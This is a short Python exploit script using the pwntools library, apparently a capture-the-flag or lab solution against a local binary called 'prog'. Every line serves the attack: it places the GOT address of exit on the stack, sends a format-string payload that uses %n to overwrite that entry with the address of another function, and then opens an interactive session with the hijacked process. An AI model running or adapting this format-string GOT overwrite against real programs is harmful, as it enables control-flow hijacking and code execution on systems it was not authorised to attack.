from pwn import *

e = ELF('prog')
context.clear(arch=e.arch, endian=e.endian)

p = e.process()
p.sendline('a'*4+pack(e.got.exit))

where = 7
many = e.sym.format - e.sym.input
p.sendline('a'*many + '%1${}d%{}$n&&ok'.format(e.sym.maybe_unused, where))

print(p.recvuntil('&&'))

p.clean()
p.interactive()
